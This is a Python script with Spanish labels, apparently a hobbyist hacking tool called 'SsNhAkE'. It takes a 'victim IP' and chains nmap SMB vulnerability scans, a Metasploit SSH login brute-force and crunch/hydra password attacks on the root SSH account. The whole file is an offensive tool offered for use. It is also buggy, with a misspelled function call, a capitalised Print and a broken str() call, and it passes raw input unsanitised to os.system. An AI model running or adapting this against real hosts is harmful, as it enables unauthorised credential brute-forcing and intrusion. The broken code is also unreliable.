import os
import sys

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ variables $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

listamenu=["Menu de Opciones:", "1--Ip Victima ","2--Escaneo SsH ","3--Ataque Nmap", "4--Ataque Msf5", "5--Ataque Hydra", "6--Exit" ]#Menu Princcipal

exit=False
key=0

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU PRINCIPAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

def menu():

	print("\033[1;31;1m ")
	os.system('figlet    SsNhAkE')
	print("\033[1;37;1m ")
	print("            "+listamenu[0])
	print("\033[1;37;m ")
	print("            "+listamenu[1])
	print("            "+listamenu[2])
	print("            "+listamenu[3])
	print("            "+listamenu[4])
	print("            "+listamenu[5])	
	print("            "+listamenu[6])

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Funciones operacionales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

def ip_ser():

	global ip_vic

	while True:

		try:

			ip_vic=(input("Introduzca ip: "))
			print(ip_vic)
			return ip_vic
			break

		except TypeError:
			print("introduzca datos de nuevo ")

def scan(ip_vic):

	os.system('cp /ssh/smb-check-vulns.nse  /usr/share/nmap/scripts/')
	os.system('nmap --script smb-vuln-ms08-067.nse -p445 '+ip_vic)
	os.system('nmap -sU --script smb-vuln-ms08-067.nse -p U:137 '+ip_vic)
	os.system('nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p22 '+ip_vic)

def ataque_nmap(ip_vic):

	os.system('nmap -script-help http-vuln-cve2013-0156.nse '+ip_vic)

def ataque_msf(ip_vic):

	print(" Instrucciones 1-run 2-sessions 3-sessions -i 1 ;)")
	os.system('msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set rhost '+ip_vic+'; set stop_on_success true; set user_file users.txt; set pass_file passwords.txt; set verbose true"')

def ataque_hydra(ip_vic):

	while True:

		try:
			val_1=(str(input("Quieres crear un diccionario: Y o N :")))

			if(val_1=='Y'):

				print("diccionario key")
				plbr=(str(input("Escriba palabra o palabras :")))
				ruta=(str("/root/ssh/key.txt"))
				line=(str("creando diccionario con las palabras ", plbr, "con la ruta ", ruta, "Ataque a la ip ", ip_vic))
				Print(line)
				os.system('crunch 3 8 '+plbr+' -o '+ruta)
				os.system('hydra -l root -P '+ruta+' '+ip_vic+' -t 4 -V ssh')

			else:

				#ruta=(str("/root/ssh/key.txt"))
				ruta=(str(input("introduzca la ruta del diccionario :")))
				os.system('hydra -l root -P '+ruta+' '+ip_vic+' -t 4 -V ssh')

			break

		except TypeError:
			print("introduzca datos de nuevo ")				

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$4 loop program $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

while exit==False:

	menu()
	key=(int(input("            "+"Select: ")))
	
	if (key==1):
		ip_ser()
	elif (key==2):
		scan(ip_vic)
	elif (key==3):
		ataque_namp(ip_vic)
	elif (key==4):
		ataque_msf(ip_vic)
	elif (key==5):
		ataque_hydra(ip_vic)
	elif (key==6):		
		exit=True
	
print("\033[1;31;1m ")	
print("Smp_A byTe_Dey_bYte_HackiNg")
print("\033[1;31;m ")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$sss